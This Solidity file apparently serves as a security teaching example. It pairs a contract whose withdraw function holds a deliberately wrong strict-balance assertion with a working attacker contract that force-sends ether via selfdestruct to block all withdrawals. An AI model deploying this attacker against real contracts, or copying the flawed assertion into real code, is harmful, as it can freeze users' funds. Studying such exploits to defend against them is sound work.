// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract SelfDestructMe {
    uint256 public totalDeposits;
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() external {
        assert(address(this).balance == totalDeposits); // wrong assertion
        uint256 amount = deposits[msg.sender];
        totalDeposits -= amount;
        deposits[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }
}

contract AttackSelfDestructMe {
    SelfDestructMe target;

    constructor(SelfDestructMe _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}
